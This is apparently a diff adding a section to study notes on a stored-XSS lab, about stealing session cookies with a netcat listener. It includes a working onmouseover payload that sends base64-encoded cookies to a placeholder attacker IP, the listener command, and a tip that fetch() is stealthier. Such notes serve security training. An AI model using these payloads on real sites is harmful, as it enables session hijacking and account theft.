@@ -337,6 +337,28 @@ we can then look in the cookielog.txt file to see the stolen cookie and then com
 
 ### Obtaining session cookies via XSS (netcat edition)
 
+instead of a cookie logging script we could have used the venerable netcat tool 
 
+lets instead use this payload in the country field: 
 
+```javascript
+<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
+```
+
+then lets create a netcat listener: 
+
+`nc -nlvp 8000`
+
+then to simulate the victim we can open a new incognito and go directly to our stored XSS profile where we see our payload:  
+
+![](Images/Pasted%20image%2020240304182117.png)
+
+each time the user hovers over the big "test" in the country section we will steal the cookie: 
+
+![](Images/Pasted%20image%2020240304182208.png)
+
+keep in mind this is the base64 encoded version 
+
+we don't always have to use the `window.location()` object that causes the victim to get redirected, we can use `fetch()` which can get data like cookies and send it to our server without redirects   
+this is stealthier 
 
